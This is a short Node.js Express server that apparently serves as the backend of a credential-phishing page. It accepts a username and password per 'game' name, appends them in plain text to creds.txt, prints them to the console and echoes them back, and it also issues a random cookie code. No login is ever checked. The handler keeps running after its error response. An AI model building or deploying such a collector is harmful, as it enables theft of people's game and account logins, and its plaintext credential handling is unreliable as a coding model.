const express = require("express");
const app = express();
var cookieParser = require('cookie-parser');
const fs = require('fs');
var pos = 0


const PORT = 8080;

app.use(cookieParser(), express.json());

app.listen(PORT,() => console.log(`http://localhost:${PORT}`));

app.get("/neon", (req,res) => {
    var codee = Math.random()
    res.cookie("code", codee, { expires: new Date(Date.now() + 900000) } );
    res.status(200).send({
        code: codee
    })
    console.log(codee);
});

app.post("/acc/:game", (req,res) => {
    pos = pos + 1
    const { game } = req.params
    const { pass } = req.body 
    const { usr } = req.body 
    if (!pass || !usr){
        res.status(418).send({
            message: "error"
        })
    }
    fs.open("creds.txt", "a", (err, fd)=>{ 
        if(err){ 
            console.log(err.message); 
        }else{ 
            fs.write(fd, `${game} ${usr}:${pass}\n`, (err, bytes)=>{ 
                if(err){ 
                    console.log(err.message); 
                }else{ 
                    console.log(bytes +' bytes written'); 
                } 
            })         
        } 
    }) 
    console.log(`${game} ${usr}:${pass}`) 
    res.status(200).send({
        game: game,
        pass: pass,
        usr: usr
    })
});